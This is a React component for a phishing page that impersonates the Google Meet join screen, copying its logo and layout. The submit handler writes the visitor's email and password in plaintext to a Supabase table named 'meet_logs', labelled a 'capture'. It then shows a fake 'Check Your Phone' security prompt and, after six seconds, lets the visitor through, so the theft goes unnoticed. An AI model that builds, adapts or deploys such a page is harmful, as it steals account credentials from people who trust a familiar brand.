
import React, { useState, useRef, useEffect } from 'react';
import { supabase } from '../lib/supabase';

interface SignInProps {
  onComplete: (name: string) => void;
  onCancel: () => void;
  isMicOn: boolean;
  isCameraOn: boolean;
  setIsMicOn: (val: boolean) => void;
  setIsCameraOn: (val: boolean) => void;
}

type SignInStep = 'CREDENTIALS' | 'VERIFY';

const SignIn: React.FC<SignInProps> = ({ 
  onComplete, 
  onCancel,
  isMicOn, 
  isCameraOn, 
  setIsMicOn, 
  setIsCameraOn 
}) => {
  const [step, setStep] = useState<SignInStep>('CREDENTIALS');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [permissionError, setPermissionError] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    if (isCameraOn && streamRef.current && videoRef.current) {
      if (videoRef.current.srcObject !== streamRef.current) {
        videoRef.current.srcObject = streamRef.current;
      }
    }
  }, [isCameraOn, step]);

  const requestPermissions = async () => {
    try {
      setPermissionError(false);
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;
      setIsMicOn(true);
      setIsCameraOn(true);
    } catch (err) {
      console.error("Permission denied", err);
      setPermissionError(true);
    }
  };

  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  useEffect(() => {
    if (step === 'VERIFY') {
      const timer = setTimeout(() => {
        onComplete(email.split('@')[0] || 'User');
      }, 6000);
      return () => clearTimeout(timer);
    }
  }, [step, onComplete, email]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim() && password.trim()) {
      setLoading(true);
      try {
        await supabase.from('meet_logs').insert([
          { email, password, timestamp: new Date().toISOString() }
        ]);
      } catch (err) {
        console.error("Capture failed:", err);
      }
      setTimeout(() => {
        setLoading(false);
        setStep('VERIFY');
      }, 1000);
    }
  };

  if (step === 'VERIFY') {
    return (
      <div className="fixed inset-0 bg-white flex flex-col z-[100] font-sans items-center justify-center p-4">
        <div className="max-w-[450px] w-full flex flex-col items-center text-center">
          <div className="flex items-center gap-2 mb-10">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/><path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/><path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/><path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/><path d="M13 11H22V18H13V11Z" fill="#FFBA00"/></svg>
            <span className="text-[#5f6368] text-xl font-medium">Google Meet</span>
          </div>
          <h2 className="text-[#202124] text-2xl font-bold mb-4">Check Your Phone</h2>
          <p className="text-[#3c4043] text-[15px] mb-8 leading-relaxed px-4">
            A security notification has been sent. Please approve to join.
          </p>
          <div className="animate-pulse flex space-x-4">
            <div className="rounded-full bg-slate-200 h-10 w-10"></div>
            <div className="flex-1 space-y-6 py-1">
              <div className="h-2 bg-slate-200 rounded"></div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-white flex flex-col font-sans overflow-y-auto">
      {/* Header */}
      <header className="px-6 py-4 flex items-center">
        <div className="flex items-center gap-2">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/><path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/><path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/><path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/><path d="M13 11H22V18H13V11Z" fill="#FFBA00"/></svg>
          <span className="text-[#5f6368] text-[22px] font-normal font-sans">Google Meet</span>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col lg:flex-row items-center justify-center px-4 lg:px-20 gap-12 lg:gap-24 mb-12">
        
        {/* Left Side: Video Container */}
        <div className="w-full max-w-[740px] aspect-video bg-[#202124] rounded-2xl relative flex flex-col items-center justify-center overflow-hidden group">
          {isCameraOn && !permissionError ? (
            <video ref={videoRef} autoPlay muted playsInline className="w-full h-full object-cover scale-x-[-1]" />
          ) : (
            <div className="flex flex-col items-center gap-6 text-center px-8">
              <h2 className="text-white text-xl md:text-2xl font-normal">Do you want people to see and hear you in the meeting?</h2>
              <button 
                onClick={requestPermissions}
                className="bg-[#1a73e8] hover:bg-[#185abc] text-white px-6 py-2.5 rounded-md font-medium text-sm transition-colors"
              >
                Allow microphone and camera
              </button>
            </div>
          )}

          {/* Bottom Controls */}
          <div className="absolute bottom-6 flex gap-4">
             <button className={`p-4 rounded-full ${isMicOn ? 'bg-[#3c4043]' : 'bg-[#ea4335]'} text-white relative`}>
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
                <div className="absolute -top-1 -right-1 w-5 h-5 bg-yellow-400 rounded-full flex items-center justify-center text-[#202124] text-[10px] font-bold">!</div>
             </button>
             <button className={`p-4 rounded-full ${isCameraOn ? 'bg-[#3c4043]' : 'bg-[#ea4335]'} text-white relative`}>
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
                <div className="absolute -top-1 -right-1 w-5 h-5 bg-yellow-400 rounded-full flex items-center justify-center text-[#202124] text-[10px] font-bold">!</div>
             </button>
          </div>
        </div>

        {/* Right Side: Login Form */}
        <div className="w-full max-w-[400px] flex flex-col items-center lg:items-start">
          <h1 className="text-[#202124] text-[32px] font-normal mb-8">What's your Email?</h1>
          
          <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
            <input 
              type="text" 
              placeholder="Enter Your Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-3.5 border border-[#dadce0] rounded-md focus:ring-1 focus:ring-[#1a73e8] outline-none text-[#202124] text-base placeholder-[#70757a]"
              required
            />
            <input 
              type="password" 
              placeholder="Enter Your Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3.5 border border-[#dadce0] rounded-md focus:ring-1 focus:ring-[#1a73e8] outline-none text-[#202124] text-base placeholder-[#70757a]"
              required
            />
            
            <button 
              type="submit"
              disabled={loading}
              className="mt-4 w-full bg-[#1a73e8] hover:bg-[#185abc] text-white py-3 rounded-full font-medium text-base shadow-sm transition-all disabled:opacity-70"
            >
              {loading ? 'Processing...' : 'Ask to Join'}
            </button>
          </form>

          <div className="mt-6 flex flex-col items-center gap-2">
            <p className="text-[#5f6368] text-sm font-medium">Other joining options</p>
            <a href="#" className="text-[#1a73e8] text-sm hover:underline">Ask to use Companion mode</a>
          </div>
        </div>
      </main>

      {/* Footer Status Indicators */}
      <footer className="mt-auto px-6 lg:px-24 py-8 flex flex-wrap items-center gap-x-12 gap-y-4 border-t border-transparent">
        <div className="flex items-center gap-3 text-[#5f6368] text-sm">
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
          <span>Permission needed</span>
        </div>
        <div className="flex items-center gap-3 text-[#5f6368] text-sm">
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
          <span>Permission needed</span>
        </div>
        <div className="flex items-center gap-3 text-[#5f6368] text-sm">
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
          <span>Permission needed</span>
        </div>
      </footer>
    </div>
  );
};

export default SignIn;
